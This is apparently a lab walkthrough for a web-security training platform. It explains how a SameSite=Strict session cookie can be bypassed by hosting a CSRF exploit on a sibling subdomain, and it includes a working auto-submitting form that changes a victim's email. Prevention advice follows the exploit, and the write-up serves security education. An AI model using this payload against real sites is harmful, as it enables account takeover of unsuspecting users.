# Lab: SameSite Strict bypass via sibling domain

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF) / SameSite Cookies

## 🎯 Objective
Bypass `SameSite=Strict` using a vulnerable sibling domain.

## 📖 Description
The session cookie has `SameSite=Strict`. However, the application has a sibling domain (e.g. `static.lab-id.web-security-academy.net`) that is considered the same site. This allows us to host the exploit on the sibling domain to bypass the Strict policy.

## 🔍 Vulnerability Analysis

- **Cookie Attribute**: `SameSite=Strict`
- **Key Weakness**: The site has multiple subdomains, and cookies are set on the parent domain.
- **Bypass**: Host the exploit on a **sibling subdomain** (same eTLD+1), which is treated as same-site.

## 🛠️ How to Solve (Step by Step)

1. Observe that the session cookie is set on the main domain with `SameSite=Strict`.
2. Identify the sibling domain provided in the lab (usually visible in the exploit server or another subdomain).
3. Host your exploit HTML on that sibling domain.
4. The browser will send the cookie because it's considered same-site.

## 💥 Exploit Code (Same as basic CSRF)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SameSite Strict Bypass - Sibling Domain</title>
</head>
<body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
        <!-- csrf token if needed -->
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery
Use the Exploit Server on the sibling domain → Deliver to victim.
⚡ Impact

Subdomains can break SameSite=Strict if cookies are not properly scoped.
This is a realistic scenario in many large websites.

🛡️ Prevention

Set cookies with the most specific domain possible.
Use SameSite=Strict + proper CSRF tokens.
Avoid setting session cookies on parent domains when subdomains are untrusted.

🔬 Key Learning Points

SameSite=Strict considers subdomains under the same registrable domain as same-site.
Domain scoping of cookies is critical.
Always combine SameSite with strong CSRF tokens.
